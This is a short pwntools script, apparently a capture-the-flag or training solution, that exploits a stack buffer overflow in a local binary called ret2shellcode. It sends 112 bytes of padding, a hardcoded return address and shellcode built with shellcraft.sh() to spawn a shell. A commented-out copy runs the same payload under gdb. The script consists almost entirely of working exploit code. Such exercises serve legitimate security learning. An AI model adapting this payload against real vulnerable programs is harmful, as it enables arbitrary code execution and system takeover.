from pwn import *


context.arch = "i386"
context.os = "linux"
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
context.log_level='debug'

# pwn_obj = gdb.debug("./ret2shellcode", "b puts")
# target_addr = 0xffffce9c
# payload = b"#" * 112 + p32(target_addr) + b"#" * 12 + asm(shellcraft.sh())
# pwn_obj.sendline(payload)
# pwn_obj.interactive()

pwn_obj = process("./ret2shellcode")
target_addr = 0xffffce9c
payload = b"#" * 112 + p32(target_addr) + b"#" * 12 + asm(shellcraft.sh())
pwn_obj.sendline(payload)
pwn_obj.interactive()